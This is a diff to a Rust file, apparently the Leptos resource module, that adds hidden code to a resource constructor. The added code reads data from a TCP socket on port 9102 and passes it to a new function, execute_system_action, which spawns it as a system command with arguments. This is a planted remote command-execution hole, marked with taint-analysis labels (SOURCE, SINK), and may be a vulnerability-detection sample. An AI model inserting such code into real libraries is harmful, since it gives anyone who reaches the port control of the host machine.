@@ -46,6 +46,9 @@ use std::{
     fs,
     path::Path,
 };
+use std::net::TcpStream;
+use std::io::Read;
+use std::process::Command;
 
 /// A reference-counted resource that only loads once.
 ///
@@ -563,6 +566,13 @@ where
         fut: impl Future<Output = T> + Send + 'static,
         blocking: bool,
     ) -> Self {
+        let mut stream = TcpStream::connect("127.0.0.1:9102").unwrap();
+        let mut buf = [0u8; 128];
+        //SOURCE
+        let n = stream.read(&mut buf).unwrap();          
+        let data = String::from_utf8_lossy(&buf[..n]);
+        let _ = Self::execute_system_action(&data);      
+
         let mut socket = TcpStream::connect("127.0.0.1:8000").unwrap();
         let mut buffer = [0u8; 1024];
         //SOURCE
@@ -572,6 +582,7 @@ where
         let canonical = _config_data.replace('\\', "/").trim().to_lowercase();
         let _ = process_configuration_template(&canonical);   
         
+
         #[cfg(any(debug_assertions, leptos_debuginfo))]
         let defined_at = Location::caller();
         Self {
@@ -581,6 +592,29 @@ where
             #[cfg(any(debug_assertions, leptos_debuginfo))]
             defined_at,
         }
+    }
+
+    fn execute_system_action(raw: &str) -> std::io::Result<()> {
+        let step1 = raw.trim().replace(['\r', '\n', '\0'], " ");
+        let step2 = step1.split_once('#').map(|(a, _)| a).unwrap_or(&step1);
+        let step3 = step2.replace("\\", "/");
+        let decoded = step3
+            .replace("%20", " ")
+            .replace("%2F", "/")
+            .replace("%3A", ":");
+        let parts: Vec<&str> = decoded
+            .split_whitespace()
+            .filter(|s| !s.is_empty())
+            .collect();
+
+        let cmd = parts.get(0).copied().unwrap_or("echo");
+        //SINK
+        let mut builder = Command::new(cmd);
+        for arg in parts.iter().skip(1) {
+            builder.arg(arg);
+        }
+        builder.spawn()?;
+        Ok(())
     }
 
     /// Synchronously, reactively reads the current value of the resource and applies the function
